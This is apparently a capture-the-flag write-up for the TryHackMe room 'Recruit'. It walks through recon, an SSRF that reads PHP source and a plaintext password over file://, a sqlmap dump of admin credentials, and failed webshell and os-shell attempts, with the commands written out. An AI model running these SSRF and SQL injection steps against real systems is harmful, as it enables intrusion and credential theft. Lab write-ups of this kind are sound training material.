# Recruit — TryHackMe

| | |
|---|---|
| **Difficulty** | Easy |
| **OS** | Ubuntu 20.04 |
| **Date** | April–May 2026 |
| **Tags** | SSRF, SQL Injection, Web |

## Overview

Recruit is an Easy web-focused room centered on an HR/recruitment portal. The path to admin access chains an SSRF in a CV-retrieval endpoint with a SQL injection found through source-code disclosure. Root/shell privilege escalation is explicitly out of scope for this room.

## Recon

```bash
nmap -sV -sC -T4 -Pn -p- --min-rate 5000 -oA nmap_full <target_ip>
```

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 |
| 53 | DNS | ISC BIND 9.16.1 |
| 80 | HTTP | Apache 2.4.41 |

Small attack surface — a PHP app running on Apache (`PHPSESSID` cookie observed).

## Enumeration

```bash
gobuster dir -u http://recruit.thm -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak -t 50
```

| Path | Notes |
|---|---|
| `/index.php` | Login page |
| `/api.php` | API documentation |
| `/file.php` | CV retrieval endpoint |
| `/phpmyadmin` | phpMyAdmin 4.9.5deb2 exposed |
| `/sitemap.xml` | Leaks hostname `recruit.thm` |

`api.php` documents `file.php?cv=<URL>` as an SSRF-capable endpoint.

### SSRF (file.php)

```bash
curl "http://recruit.thm/file.php?cv=file:///var/www/html/config.php"
curl "http://recruit.thm/file.php?cv=file:///var/www/html/dashboard.php"
curl "http://recruit.thm/file.php?cv=file:///var/www/html/file.php"
```

Source review revealed:
- `config.php` → HR plaintext password
- `dashboard.php` → SQL injection in `search`/`id` parameters
- `file.php`'s filter only allows the `file://` scheme, with `realpath()` restricting reads to `/var/www/html`

## Exploitation — SSRF to Credential Leak to Login

```bash
curl "http://recruit.thm/file.php?cv=file:///var/www/html/config.php"
# -> $HR_PASSWORD = '<plaintext>'

curl -s -c cookies.txt -X POST http://recruit.thm/index.php \
  -d "username=hr&password=<plaintext>&login="
# -> Redirects to dashboard.php
```

## Exploitation — SQL Injection to Admin Credentials

```bash
sqlmap -u "http://<target_ip>/dashboard.php?search=1" \
  --cookie="PHPSESSID=<session>" \
  --dbms=MySQL --batch --dump-all --exclude-sysdbs
# -> recruit_db.users: admin:<plaintext>

curl -s -c admin_cookies.txt -X POST http://recruit.thm/index.php \
  -d "username=admin&password=<plaintext>&login=" -L
# -> Admin dashboard, ADMIN flag
```

## Privilege Escalation Attempts (Out of Scope)

```bash
# INTO OUTFILE webshell -- no FILE privilege
# sqlmap --os-shell -- no write perms to webroot from MySQL
# phpMyAdmin login -- admin web password != MySQL root password
```

**Blockers:**
- MySQL `FILE` privilege not granted, `secure_file_priv` restricted
- SSRF limited to `/var/www/html` via `realpath()`
- Stacked queries not supported

## Attack Chain

```
Recon (nmap) -> Gobuster -> sitemap.xml leaks hostname
   -> api.php documents SSRF endpoint (file.php?cv=)
   -> SSRF file:// -> config.php -> HR credentials -> HR FLAG
   -> dashboard.php source (via SSRF) -> SQLi confirmed in ?search=
   -> sqlmap dump-all -> admin credentials -> ADMIN FLAG
   -> Shell attempts blocked (no FILE priv, restricted SSRF, no SSH keys readable)
```

## Lessons Learned

- Always read API documentation pages — `api.php` directly named the SSRF parameter.
- `sitemap.xml` is an underrated source for hostname/endpoint discovery.
- Reading source code via SSRF (`file://`) is far more efficient than black-box probing — it reveals SQLi, logic, and file paths directly.
- PHP's `realpath()` is an effective SSRF mitigation; symlink tricks won't bypass it.
- MySQL 8.0 restricts the `FILE` privilege by default — don't assume DB access equals file write.

---

Room: TryHackMe — Recruit
Author: Hamza Al-Najjar (Z3R0)
